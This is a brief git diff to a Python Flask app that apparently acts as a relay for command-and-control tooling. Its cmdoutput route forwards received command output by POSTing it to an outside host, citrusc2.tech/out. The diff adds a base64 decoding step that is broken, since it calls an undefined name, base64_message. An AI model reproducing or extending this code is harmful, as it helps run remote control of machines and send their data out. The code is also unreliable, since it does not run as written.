@@ -4,6 +4,7 @@ from flask_cors import CORS
 
 import requests
 import uuid
+import base64
 
 from routes import client_api
 from routes import *
@@ -25,7 +26,10 @@ def cmdoutput():
     l = request.form.keys()
     output = ""
     output = output.join(l)
-    r = requests.post('http://citrusc2.tech/out', data={'output': output})
+    base64_bytes = base64_message.encode(output)
+    message_bytes = base64.b64decode(base64_bytes)
+    message = message_bytes.decode('ascii')
+    r = requests.post('http://citrusc2.tech/out', data={'output': message})
     return output
 
 
